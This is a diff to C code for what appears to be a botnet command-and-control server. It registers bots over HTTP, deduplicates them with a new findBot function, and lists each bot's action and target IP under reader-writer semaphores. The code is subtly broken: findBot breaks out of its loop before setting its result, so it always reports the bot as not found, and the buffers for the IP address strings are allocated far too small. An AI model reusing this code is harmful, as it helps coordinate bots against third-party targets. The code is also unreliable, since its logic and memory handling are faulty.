@@ -37,6 +37,7 @@ void parent(int pid);
 void child();
 void hello();
 int registerBot(const char *bot_ip, const char *bot_port);
+int findBot(struct in_addr, long port);
 
 int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
                    const char *method, const char *version, const char *upload_data,
@@ -52,14 +53,22 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
     const char *bot_ip = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_IP);
     const char *bot_port = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_PORT);
 
-    ret = registerBot(bot_ip, bot_port);
+    long port = atol(bot_port);
+    struct in_addr address;
+    inet_pton(AF_INET, bot_ip, &(address));
 
-    if (ret < 0)
+    if (findBot(address, port) == -1)
     {
-        const char *msg = "NOT OK";
+
+        ret = registerBot(bot_ip, bot_port);
+
+        if (ret < 0)
+        {
+            const char *msg = "NOT OK";
+        }
+        printf("Bot Connected \n");
     }
 
-    printf("Bot Connected \n");
     list_botnet(1);
     MHD_destroy_response(response);
 
@@ -113,7 +122,7 @@ int list_botnet(int active)
     int ret = sem_wait(&r);
     if (ret < 0)
     {
-        handle_error("Error in wait sem w");
+        handle_error("Error in wait sem r");
     }
 
     readcount++;
@@ -131,7 +140,7 @@ int list_botnet(int active)
     ret = sem_post(&r);
     if (ret < 0)
     {
-        handle_error("Error in post sem w");
+        handle_error("Error in post sem r");
     }
 
     if (botnet == NULL)
@@ -148,15 +157,15 @@ int list_botnet(int active)
         return -1;
     }
 
-        char * target_ip = (char**) malloc(sizeof(INET_ADDRSTRLEN));
-        char * bot_ip = (char**) malloc(sizeof(INET_ADDRSTRLEN));
+    char *target_ip = (char **)malloc(sizeof(INET_ADDRSTRLEN));
+    char *bot_ip = (char **)malloc(sizeof(INET_ADDRSTRLEN));
     while (bot != NULL)
     {
         if (active == 1)
         {
 
-            inet_ntop(AF_INET,&(bot->bot_address),bot_ip,INET_ADDRSTRLEN);
-            inet_ntop(AF_INET,&(bot->target_address),target_ip,INET_ADDRSTRLEN);
+            inet_ntop(AF_INET, &(bot->bot_address), bot_ip, INET_ADDRSTRLEN);
+            inet_ntop(AF_INET, &(bot->target_address), target_ip, INET_ADDRSTRLEN);
 
             printf("BOT_ID: %d - IP: %s - PORT: %ld - ACTION: %s  - TARGET: %s \n", bot->bot_id, bot_ip, bot->port, bot->action, target_ip);
         }
@@ -171,7 +180,7 @@ int list_botnet(int active)
     ret = sem_wait(&r);
     if (ret < 0)
     {
-        handle_error("Error in wait sem w");
+        handle_error("Error in wait sem r");
     }
     readcount--;
     if (readcount == 0)
@@ -183,7 +192,7 @@ int list_botnet(int active)
     ret = sem_post(&r);
     if (ret < 0)
     {
-        handle_error("Error in post sem w");
+        handle_error("Error in post sem r");
     }
 
     return 1;
@@ -458,7 +467,7 @@ int registerBot(const char *bot_ip, const char *bot_port)
 
     bot->next = (active_bots *)malloc(sizeof(active_bots));
 
-    ret = inet_pton(AF_INET,bot_ip, &(bot->next->bot_address));
+    ret = inet_pton(AF_INET, bot_ip, &(bot->next->bot_address));
     if (ret == 0)
     {
         handle_error("Could not parse bot_ip to in_addr");
@@ -474,5 +483,68 @@ int registerBot(const char *bot_ip, const char *bot_port)
     {
         handle_error("Error in post sem w");
     }
+    return res;
+}
+
+int findBot(struct in_addr address, long port)
+{
+    int res = -1;
+
+    int ret = sem_wait(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in wait sem r");
+    }
+
+    readcount++;
+
+    if (readcount == 1)
+    {
+
+        ret = sem_wait(&w);
+        if (ret < 0)
+        {
+            handle_error("Error in wait sem w");
+        }
+    }
+
+    ret = sem_post(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem r");
+    }
+
+       active_bots *bot = botnet;
+
+    char *target_ip = (char **)malloc(sizeof(INET_ADDRSTRLEN));
+    char *bot_ip = (char **)malloc(sizeof(INET_ADDRSTRLEN));
+    while (bot != NULL)
+    {
+        if (bot->bot_address.s_addr == address.s_addr && bot->port == port)
+        {
+            break;
+            res = 1;
+        }
+        bot = bot->next;
+    }
+
+    ret = sem_wait(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in wait sem r");
+    }
+    readcount--;
+    if (readcount == 0)
+        ret = sem_post(&w);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem w");
+    }
+    ret = sem_post(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem r");
+    }
+
     return res;
 }
